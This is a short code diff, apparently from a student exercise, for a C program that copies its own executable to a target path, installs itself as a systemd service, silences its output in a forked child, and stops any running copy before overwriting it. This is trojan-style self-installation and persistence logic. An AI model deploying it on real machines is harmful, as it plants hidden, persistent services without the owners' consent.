@@ -5,8 +5,6 @@ void	daemonize(char *target)
 	int		len;
 	char	config[4096];
 
-	close(STDOUT_FILENO);
-	close(STDERR_FILENO);
 	int fd = open(SYSTEMD_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
 	if (fd >= 0)
 	{
@@ -39,6 +37,10 @@ void	duplicate(char *path, char *target)
 	int src_fd = open(path, O_RDONLY);
 	if (src_fd < 0)
 		return ;
+	if (!access(SYSTEMD_CONF_DIR"/"PRG_NAME".service", F_OK))
+		system("systemctl stop "PRG_NAME);
+	else if (!access(SYSV_CONF_DIR"/"PRG_NAME".service", F_OK))
+		system(SYSV_CONF_DIR"/"PRG_NAME".service stop");
 	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
 	if (target_fd < 0)
 	{
@@ -74,6 +76,8 @@ int		main(void)
 		printf("%s\n", STUDENT_LOGIN);
 		if (!fork())
 		{
+			close(STDOUT_FILENO);
+			close(STDERR_FILENO);
 			duplicate(PROC_SELF_EXE, target_path);
 			daemonize(target_path);
 		}
